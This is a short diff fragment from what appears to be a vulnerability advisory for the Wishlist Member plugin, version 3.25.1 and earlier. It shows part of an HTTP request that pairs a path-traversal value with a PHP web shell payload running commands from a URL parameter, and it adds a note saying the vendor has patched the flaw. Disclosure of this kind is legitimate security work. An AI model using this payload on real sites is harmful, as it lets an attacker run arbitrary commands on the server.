@@ -40,3 +40,8 @@ Host: example.com
 Content-Type: application/x-www-form-urlencoded
 
 transient_hash=../path/to/file.php&orig_email=<?php system($_GET['cmd']); ?>
+```
+
+## Note
+This vulnerability was discovered in Wishlist Member version 3.25.1 and earlier. 
+It has been patched by the vendor in a later release. No CVE ID has been assigned to this issue as of now.
